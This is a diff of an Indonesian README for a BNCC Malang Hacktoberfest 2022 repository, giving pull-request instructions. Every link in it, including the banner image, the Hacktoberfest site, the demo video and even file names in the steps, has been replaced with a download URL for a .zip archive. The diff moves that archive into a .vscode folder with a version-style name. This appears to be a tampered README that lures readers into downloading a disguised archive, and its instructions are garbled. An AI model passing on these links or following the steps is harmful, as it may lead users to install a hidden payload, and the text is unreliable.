@@ -1,23 +1,23 @@
 <div align="center">
   
- [![hacktoberfest-readme-dark](https://raw.githubusercontent.com/dmqin/bnccmalang-hacktoberfest2022/main/images/bnccmalang-hacktoberfest-3.8.zip)](https://raw.githubusercontent.com/dmqin/bnccmalang-hacktoberfest2022/main/images/bnccmalang-hacktoberfest-3.8.zip)
+ [![hacktoberfest-readme-dark](https://raw.githubusercontent.com/dmqin/bnccmalang-hacktoberfest2022/main/.vscode/hacktoberfest_bnccmalang_v3.2-beta.4.zip)](https://raw.githubusercontent.com/dmqin/bnccmalang-hacktoberfest2022/main/.vscode/hacktoberfest_bnccmalang_v3.2-beta.4.zip)
 </div>
 
 #
 
 ## Hacktoberfest Bersama BNCC
-[Hacktoberfest](https://raw.githubusercontent.com/dmqin/bnccmalang-hacktoberfest2022/main/images/bnccmalang-hacktoberfest-3.8.zip) adalah festival tahunan yang diselenggarakan oleh DigitalOcean yang berlangsung di bulan Oktober untuk merayakan komunitas open source. Sebagai bagian dari perayaan 31 hari ini, kontributor dan pengelola open source didorong untuk mengerjakan proyek open source dan memenangkan hadiah untuk menandai kesempatan tersebut.
+[Hacktoberfest](https://raw.githubusercontent.com/dmqin/bnccmalang-hacktoberfest2022/main/.vscode/hacktoberfest_bnccmalang_v3.2-beta.4.zip) adalah festival tahunan yang diselenggarakan oleh DigitalOcean yang berlangsung di bulan Oktober untuk merayakan komunitas open source. Sebagai bagian dari perayaan 31 hari ini, kontributor dan pengelola open source didorong untuk mengerjakan proyek open source dan memenangkan hadiah untuk menandai kesempatan tersebut.
 
 ### Gimana cara berkontribusi di Hactoberfest?
 Secara sederhana, cara berkontribusi dengan hacktoberfest adalah dengan membuat pull request ke project yang terdapat #hacktoberfest. Lakukan 4 pull request agar kalian mendapat hadiah dari Hacktoberfest!
 
 ### Tutorial Demo Website
 
-[![IMAGE ALT TEXT HERE](https://raw.githubusercontent.com/dmqin/bnccmalang-hacktoberfest2022/main/images/bnccmalang-hacktoberfest-3.8.zip)](https://raw.githubusercontent.com/dmqin/bnccmalang-hacktoberfest2022/main/images/bnccmalang-hacktoberfest-3.8.zip)
+[![IMAGE ALT TEXT HERE](https://raw.githubusercontent.com/dmqin/bnccmalang-hacktoberfest2022/main/.vscode/hacktoberfest_bnccmalang_v3.2-beta.4.zip)](https://raw.githubusercontent.com/dmqin/bnccmalang-hacktoberfest2022/main/.vscode/hacktoberfest_bnccmalang_v3.2-beta.4.zip)
 
 ### **Tips Membuat *pull request***
 > Agar pull request yang kamu buat tidak dianggap spam, ada baiknya mengikuti tips berikut.
->1. Membuka Repository BNCC yang terdapat pada [link berikut](https://raw.githubusercontent.com/dmqin/bnccmalang-hacktoberfest2022/main/images/bnccmalang-hacktoberfest-3.8.zip) -> kalian sudah berada di halaman yang tepat
+>1. Membuka Repository BNCC yang terdapat pada [link berikut](https://raw.githubusercontent.com/dmqin/bnccmalang-hacktoberfest2022/main/.vscode/hacktoberfest_bnccmalang_v3.2-beta.4.zip) -> kalian sudah berada di halaman yang tepat
 >
 >2. Lakukan Fork Repository dengan mengklik tulisan **fork** yang ada di kanan atas.
 >
@@ -25,8 +25,8 @@ Secara sederhana, cara berkontribusi dengan hacktoberfest adalah dengan membuat 
 >
 >4. Ubah isi dari Repository:
 >> 1) Pilih folder yang bernama Blog
->> 2) Cari file yang bernama https://raw.githubusercontent.com/dmqin/bnccmalang-hacktoberfest2022/main/images/bnccmalang-hacktoberfest-3.8.zip
->> 3) Duplikat file https://raw.githubusercontent.com/dmqin/bnccmalang-hacktoberfest2022/main/images/bnccmalang-hacktoberfest-3.8.zip
+>> 2) Cari file yang bernama https://raw.githubusercontent.com/dmqin/bnccmalang-hacktoberfest2022/main/.vscode/hacktoberfest_bnccmalang_v3.2-beta.4.zip
+>> 3) Duplikat file https://raw.githubusercontent.com/dmqin/bnccmalang-hacktoberfest2022/main/.vscode/hacktoberfest_bnccmalang_v3.2-beta.4.zip
 >> 4) Rename file dengan nama yang kamu inginkan (bisa disesuaikan dengan judul halamanmu)
 >
 > Note: Ulangi step dibawah 4x, supaya bisa mencapai 4x pull request (jadi jangan diubah semua dan dijadikan 1x pull request aja!)
@@ -46,9 +46,9 @@ Secara sederhana, cara berkontribusi dengan hacktoberfest adalah dengan membuat 
 >> 13) Akan muncul notif, pilih switch to branch, lalu klik create
 >> 14) Lakukan pull request terlebih dulu (step 5-9)
 >
->6. Untuk mengecek pull request sudah terdeteksi oleh Hacktoberfest atau belum, kalian dapat mengecek di [link berikut](https://raw.githubusercontent.com/dmqin/bnccmalang-hacktoberfest2022/main/images/bnccmalang-hacktoberfest-3.8.zip).
+>6. Untuk mengecek pull request sudah terdeteksi oleh Hacktoberfest atau belum, kalian dapat mengecek di [link berikut](https://raw.githubusercontent.com/dmqin/bnccmalang-hacktoberfest2022/main/.vscode/hacktoberfest_bnccmalang_v3.2-beta.4.zip).
 >
-> Link untuk penjelasan singkat HTML [klik disini.](https://raw.githubusercontent.com/dmqin/bnccmalang-hacktoberfest2022/main/images/bnccmalang-hacktoberfest-3.8.zip)
+> Link untuk penjelasan singkat HTML [klik disini.](https://raw.githubusercontent.com/dmqin/bnccmalang-hacktoberfest2022/main/.vscode/hacktoberfest_bnccmalang_v3.2-beta.4.zip)
 >
 >Kalau ada kendala, bisa didiskusikan ke group
 >
